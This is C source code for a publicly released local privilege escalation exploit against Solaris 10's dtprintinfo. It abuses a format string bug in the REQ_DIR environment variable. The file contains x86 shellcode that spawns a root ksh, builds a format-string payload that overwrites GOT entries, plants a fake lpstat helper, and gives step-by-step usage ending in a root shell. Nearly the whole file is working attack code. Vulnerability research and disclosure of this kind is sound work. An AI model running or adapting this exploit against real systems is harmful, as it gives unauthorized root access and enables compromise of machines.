/*
 * raptor_dtprintcheckdir_intel2.c - Solaris/Intel FMT LPE
 * Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * "I'm gonna have to go into hardcore hacking mode!" -- Hackerman
 * https://youtu.be/KEkrWRHCDQU
 *
 * Same code snippet, different vulnerability. 20 years later, format string
 * bugs are not extinct after all! The vulnerable function looks like this:
 *
 * void __0FJcheck_dirPcTBPPP6QStatusLineStructPii(...)
 * {
 * ...
 * 	char local_724 [300];
 * ...
 * 	else {
 * 		__format = getenv("REQ_DIR");
 * 		sprintf(local_724,__format,param_2); // [1]
 * 	}
 * ...
 * 	local_c = strlen(local_724); // [2]
 * 	sprintf(local_5f8,"/var/spool/lp/tmp/%s/",param_2); // [3]
 * ...
 * }
 *
 * The plan (inspired by an old technique devised by gera) is to exploit the 
 * sprintf at [1], where we control the format string, to replace the strlen 
 * at [2] with a strdup and the sprintf at [3] with a call to the shellcode
 * dynamically allocated in the heap by strdup and pointed to by the local_c 
 * variable at [2]. In practice, to pull this off the structure of the evil 
 * environment variable REQ_DIR must be:
 * [sc] [pad] [.got/strlen] [.got/sprintf] [stackpop] [W .plt/strdup] [W call *-0x8(%ebp)]
 *
 * To collect the needed addresses for your system, use:
 * $ objdump -R /usr/dt/bin/dtprintinfo | grep strlen # .got
 * 080994cc R_386_JUMP_SLOT   strlen
 * $ objdump -R /usr/dt/bin/dtprintinfo | grep sprintf # .got
 * 080994e4 R_386_JUMP_SLOT   sprintf
 * $ objdump -x /usr/dt/bin/dtprintinfo | grep strdup # .plt
 * 0805df20       F *UND*  00000000 strdup
 * $ objdump -d /usr/dt/bin/dtprintinfo | grep call | grep ebp | grep -- -0x8 # .text
 * 08067f52:       ff 55 f8                call   *-0x8(%ebp)
 *
 * This bug was likely fixed during the general cleanup of CDE code done by
 * Oracle in response to my recently reported vulnerabilities. However, I can't
 * confirm this because I have no access to their patches:/
 *
 * See also:
 * raptor_dtprintcheckdir_intel.c (vulnerability found by Marti Guasch Jimenez)
 * raptor_dtprintcheckdir_sparc.c (just a proof of concept)
 * raptor_dtprintcheckdir_sparc2.c (the real deal)
 *
 * Usage:
 * $ gcc raptor_dtprintcheckdir_intel2.c -o raptor_dtprintcheckdir_intel2 -Wall
 * [on your xserver: disable the access control]
 * $ ./raptor_dtprintcheckdir_intel2 192.168.1.1:0
 * [on your xserver: double click on the fake "fnord" printer]
 * [...]
 * # id
 * uid=0(root) gid=1(other)
 * #
 *
 * Tested on:
 * SunOS 5.10 Generic_147148-26 i86pc i386 i86pc (Solaris 10 1/13)
 * [previous Solaris versions are also likely vulnerable]
 */

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/systeminfo.h>

#define INFO1	"raptor_dtprintcheckdir_intel2.c - Solaris/Intel FMT LPE"
#define INFO2	"Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN		"/usr/dt/bin/dtprintinfo"	// vulnerable program
#define	BUFSIZE		300				// size of evil env var
#define	STACKPOPSEQ	"%.8x"				// stackpop sequence
#define	STACKPOPS	14				// number of stackpops

/* replace with valid addresses for your system */
#define STRLEN		0x080994cc			// .got strlen address
#define	SPRINTF		0x080994e4			// .got sprintf address
#define STRDUP		0x0805df20			// .plt strdup address
#define	RET		0x08067f52			// call *-0x8(%ebp) address

/* split an address in 4 bytes */
#define SPLITB(b1, b2, b3, b4, addr) {	\
	b1 = (addr & 0x000000ff);	\
	b2 = (addr & 0x0000ff00) >> 8;	\
	b3 = (addr & 0x00ff0000) >> 16;	\
	b4 = (addr & 0xff000000) >> 24;	\
}

char sc[] = /* Solaris/x86 shellcode (8 + 8 + 27 = 43 bytes) */
/* double setuid() */
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
/* execve() */
"\x31\xc0\x50\x68/ksh\x68/bin"
"\x89\xe3\x50\x53\x89\xe2\x50"
"\x52\x53\xb0\x3b\x50\xcd\x91";

/* globals */
char	*arg[2] = {"foo", NULL};
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char		buf[BUFSIZE], *p = buf;
	char		platform[256], release[256], display[256];

	int		i, stackpops = STACKPOPS;
	unsigned	base, n1, n2, n3, n4, n5, n6, n7, n8;
	unsigned char	strdup1, strdup2, strdup3, strdup4;
	unsigned char	ret1, ret2, ret3, ret4;

	int		strlen_got = STRLEN;
	int		sprintf_got = SPRINTF;
	int		strdup_plt = STRDUP;
	int		ret = RET;

	/* lpstat code to add a fake printer */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for fnord: /dev/null\n");
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: fnord\n");
		}
		exit(0);
	}

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* process command line */
	if (argc != 2) {
		fprintf(stderr, "usage: %s xserver:display\n\n", argv[0]);
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);

	/* evil env var: name + shellcode + padding */
	bzero(buf, BUFSIZE);
	sprintf(buf, "REQ_DIR=%s#", sc);
	p += strlen(buf);

	/* format string: .got strlen address */
	*((void **)p) = (void *)(strlen_got); p += 4;
	memset(p, 'A', 4); p += 4; /* dummy */
	*((void **)p) = (void *)(strlen_got + 1); p += 4;
	memset(p, 'A', 4); p += 4; /* dummy */
	*((void **)p) = (void *)(strlen_got + 2); p += 4;
	memset(p, 'A', 4); p += 4; /* dummy */
	*((void **)p) = (void *)(strlen_got + 3); p += 4;
	memset(p, 'A', 4); p += 4; /* dummy */

	/* format string: .got sprintf address */
	*((void **)p) = (void *)(sprintf_got); p += 4;
	memset(p, 'A', 4); p += 4; /* dummy */
	*((void **)p) = (void *)(sprintf_got + 1); p += 4;
	memset(p, 'A', 4); p += 4; /* dummy */
	*((void **)p) = (void *)(sprintf_got + 2); p += 4;
	memset(p, 'A', 4); p += 4; /* dummy */
	*((void **)p) = (void *)(sprintf_got + 3); p += 4;

	/* format string: stackpop sequence */
	base = strlen(buf) - strlen("REQ_DIR=");
	for (i = 0; i < stackpops; i++, p += strlen(STACKPOPSEQ), base += 8)
		strcat(p, STACKPOPSEQ);

	/* calculate numeric arguments for .plt strdup address */
	SPLITB(strdup1, strdup2, strdup3, strdup4, strdup_plt);
	n1 = (strdup1 - base)					% 0x100;
	n2 = (strdup2 - base - n1)				% 0x100;
	n3 = (strdup3 - base - n1 - n2)				% 0x100;
	n4 = (strdup4 - base - n1 - n2 - n3)			% 0x100;

	/* calculate numeric arguments for call *-0x8(%ebp) address */
	SPLITB(ret1, ret2, ret3, ret4, ret);
	n5 = (ret1 - base - n1 - n2 - n3 - n4)			% 0x100;
	n6 = (ret2 - base - n1 - n2 - n3 - n4 - n5)		% 0x100;
	n7 = (ret3 - base - n1 - n2 - n3 - n4 - n5 - n6)	% 0x100;
	n8 = (ret4 - base - n1 - n2 - n3 - n4 - n5 - n6 - n7)	% 0x100;

	/* check for potentially dangerous numeric arguments below 10 */
	n1 += (n1 < 10) ? (0x100) : (0);
	n2 += (n2 < 10) ? (0x100) : (0);
	n3 += (n3 < 10) ? (0x100) : (0);
	n4 += (n4 < 10) ? (0x100) : (0);
	n5 += (n5 < 10) ? (0x100) : (0);
	n6 += (n6 < 10) ? (0x100) : (0);
	n7 += (n7 < 10) ? (0x100) : (0);
	n8 += (n8 < 10) ? (0x100) : (0);

	/* format string: write string */
	sprintf(p, "%%%dx%%n%%%dx%%n%%%dx%%n%%%dx%%n%%%dx%%n%%%dx%%n%%%dx%%n%%%dx%%n", n1, n2, n3, n4, n5, n6, n7, n8);

	/* fill the envp, keeping padding */
	add_env(buf);
	add_env(display);
	add_env("TMP_DIR=/tmp");
	add_env("PATH=.:/usr/bin");
	add_env("HOME=/tmp");
	add_env(NULL);

	/* we need at least one directory inside TMP_DIR to trigger the bug */
	mkdir("/tmp/one_dir", S_IRWXU | S_IRWXG | S_IRWXO);

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");

	/* print some output */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	fprintf(stderr, "Using SI_PLATFORM\t\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using strlen address in .got\t: 0x%p\n", (void *)strlen_got);
	fprintf(stderr, "Using sprintf address in .got\t: 0x%p\n", (void *)sprintf_got);
	fprintf(stderr, "Using strdup address in .plt\t: 0x%p\n", (void *)strdup_plt);
	fprintf(stderr, "Using call *-0x8(%%ebp) address\t: 0x%p\n\n", (void *)ret);

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(1);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return env_len;
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return env_len;
}
